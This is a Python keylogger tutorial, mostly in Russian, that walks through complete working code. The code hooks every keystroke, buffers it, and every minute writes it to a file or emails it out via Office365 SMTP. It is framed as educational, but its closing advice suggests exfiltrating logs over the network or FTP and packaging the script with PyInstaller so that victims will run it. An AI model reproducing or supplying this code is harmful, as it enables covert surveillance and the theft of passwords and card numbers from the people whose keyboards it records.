# [Writing a Keylogger in Python from Scratch](https://www.thepythoncode.com/article/write-a-keylogger-python)
To run this:
- `pip3 install -r requirements.txt`
- Get a fresh Gmail Account, check this [tutorial](https://www.thepythoncode.com/article/write-a-keylogger-python) to set it up.
##
# [[] / []]()
Кейлоггер — это тип технологии наблюдения, используемый для мониторинга и записи каждого нажатия клавиши, набранного на клавиатуре конкретного компьютера. Из этого туториала Вы узнаете, как написать кейлоггер на Python.

Возможно, вам интересно, почему кейлоггер полезен? Ну, когда хакер (или скриптовый ребенок) использует это в неэтичных целях, он / она зарегистрирует все, что вы вводите на клавиатуре, включая ваши учетные данные (номера кредитных карт, пароли и т. Д.).

Цель этого учебника - рассказать вам об этих типах скриптов и узнать, как самостоятельно реализовывать такие вредоносные скрипты в образовательных целях. Давайте начнем!

Связанные с: Как сделать сканер портов в Python.

Во-первых, нам нужно будет установить модуль под названием клавиатура, зайти в терминал или командную строку и написать:

$ pip install keyboard
Этот модуль позволяет вам полностью контролировать клавиатуру, подключать глобальные события, регистрировать горячие клавиши, имитировать нажатия клавиш и многое другое, и это небольшой модуль.

Итак, скрипт Python выполнит следующие действия:

Слушайте нажатия клавиш в фоновом режиме.
Всякий раз, когда клавиша нажимается и отпускается, мы добавляем ее в глобальную строковую переменную.
Каждые N минут сообщайте о содержимом этой строковой переменной либо в локальный файл (для загрузки на FTP-сервер или использования API Google Диска), либо по электронной почте.
Получите: Создайте более 35 этических хакерских инструментов и скриптов с помощью электронной книги Python

Начнем с импорта необходимых модулей:

import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
Если вы решите сообщать о журналах ключей по электронной почте, вам следует настроить учетную запись электронной почты в Outlook или любом другом поставщике и убедиться, что сторонним приложениям разрешено входить в систему по электронной почте и с паролем.

Примечание: С 30 мая 2022 года Google больше не поддерживает использование сторонних приложений или устройств, которые просят вас войти в свой аккаунт Google, используя только ваше имя пользователя и пароль. Поэтому этот код не будет работать для учетных записей Gmail. Если вы хотите взаимодействовать со своей учетной записью Gmail на Python, я настоятельно рекомендую вам вместо этого использовать учебник по API Gmail.

Теперь инициализируем наши параметры:

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"
Заметка: Очевидно, что вам нужно указать свои правильные учетные данные электронной почты; в противном случае отправка сообщений по электронной почте не будет работать.

Установка SEND_REPORT_EVERY на 60 означает, что мы сообщаем наши журналы ключей каждые 60 секунд (т. Е. Одну минуту). Не стесняйтесь редактировать это в соответствии с вашими потребностями.

Лучший способ представить кейлоггер — создать для него класс, и каждый метод в этом классе выполняет определенную задачу:

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
По умолчанию мы устанавливаем report_method «email», что означает, что мы будем отправлять журналы ключей на нашу электронную почту. Вы увидите, как мы передаем «файл» позже, и он сохранит его в локальный файл.

Теперь нам нужно будет использовать функцию on_release() клавиатуры, которая принимает обратный вызов, который будет вызываться для каждого KEY_UP event (всякий раз, когда вы отпускаете клавишу на клавиатуре), этот обратный вызов принимает один параметр, который является KeyboardEvent, который имеет атрибут name, давайте реализуем его:

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
Поэтому всякий раз, когда клавиша отпускается, нажатая кнопка добавляется к .log строковой переменной.

Если мы решим сообщить о наших ключевых журналах в локальный файл, за это отвечают следующие методы:

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
Связанные с: Получите этический взлом с помощью электронной книги Python.
Метод update_filename() прост; берем записанные даты и преобразуем их в читаемую строку. После этого мы создаем имя файла на основе этих дат, которое мы будем использовать для именования наших файлов ведения журнала.

Метод report_to_file() создает новый файл с именем self.filename и сохраняет там журналы ключей.

Затем нам нужно будет реализовать метод, который, учитывая сообщение (в данном случае журналы ключей), отправляет его по электронной почте (перейдите к этому руководству для получения дополнительной информации о том, как это делается):

    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
Метод prepare_mail() принимает сообщение в виде обычной строки Python и создает объект MIMEMultipart, который помогает нам создавать как HTML,так и текстовую версию почты.

Затем мы используем метод prepare_mail() в sendmail() для отправки электронной почты. Обратите внимание, что мы использовали SMTP-серверы Office365 для входа в нашу учетную запись электронной почты. Если вы используете другого поставщика, убедитесь, что вы используете его SMTP-серверы. Проверьте этот список SMTP-серверов наиболее распространенных поставщиков услуг электронной почты.

В конце концов, мы прерываем SMTP-соединение и печатаем простое сообщение.

Далее мы создаем метод, который сообщает о ключевых журналах через каждый период времени. Другими словами, каждый раз вызывает sendmail() или report_to_file():

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
Узнайте также: Как создать программу-вымогатель в Python.

Итак, мы проверяем, получила ли что-то переменная self.log (пользователь нажал что-то в этот период). Если это так, сообщите об этом, либо сохранив его в локальный файл, либо отправив его по электронной почте.

Затем мы передали self.interval (в этом уроке я установил его на 1 минуту или 60 секунд, не стесняйтесь настраивать его в соответствии с вашими потребностями) и функцию self.report() в класс Timer(), а затем вызовем метод start() после того, как мы установим его в качестве потока демона.

Таким образом, метод, который мы только что реализовали, отправляет нажатия клавиш по электронной почте или сохраняет их в локальный файл (на основе report_method) и вызывает себя рекурсивно каждую секунду self.interval в отдельных потоках.

Определим метод, вызывающий метод on_release():

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()
Дополнительные сведения об использовании модуля клавиатуры см. в этом учебнике.

Этот метод start() — это то, что мы будем использовать вне класса, так как это основной метод; мы используем метод keyboard.on_release() для передачи ранее определенного метода callback().

После этого мы вызываем наш метод self.report(), который выполняется в отдельном потоке, и, наконец, мы используем метод wait() из модуля клавиатуры, чтобы заблокировать текущий поток, чтобы мы могли выйти из программы с помощью CTRL + C.

Мы в основном закончили с классом Keylogger, все, что нам нужно сделать сейчас, это создать экземпляр этого класса, который мы только что создали:

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
Если вам нужны отчеты по электронной почте, вы должны раскомментировать первый экземпляр, где у нас есть report_method = "email". В противном случае, если вы хотите сообщить о ключевых журналах через файлы в текущую директорию, то вам следует использовать второй, report_method установить «файл».

Когда вы выполняете скрипт с помощью отчетов по электронной почте, он будет записывать ваши нажатия клавиш, и через каждую минуту он будет отправлять все журналы на электронную почту, дайте ему попробовать!

Вот что я получил в своем письме через минуту:

Результаты кейлоггера

Это было на самом деле то, что я нажимал на свою личную клавиатуру в тот период!

Когда вы запускаете его с report_method="file" (по умолчанию), то вы должны начать видеть файлы журнала в текущем каталоге после каждой минуты:

Файлы журнала кейлоггера
И вы увидите что-то вроде этого в консоли:

[+] Saved keylog-2020-12-18-150850_2020-12-18-150950.txt
[+] Saved keylog-2020-12-18-150950_2020-12-18-151050.txt
[+] Saved keylog-2020-12-18-151050_2020-12-18-151150.txt
[+] Saved keylog-2020-12-18-151150_2020-12-18-151250.txt
...
Получите скидку -10%: Этический взлом с электронной книгой Python.
Заключение
Теперь вы можете расширить его для отправки файлов журналов по сети, или вы можете использовать Google Drive API для загрузки их на свой диск, или вы даже можете загрузить их на свой FTP-сервер.

Кроме того, поскольку никто не будет выполнять файл .py, вы можете встроить этот код в исполняемый файл с помощью библиотек с открытым исходным кодом, таких как Pyinstaller.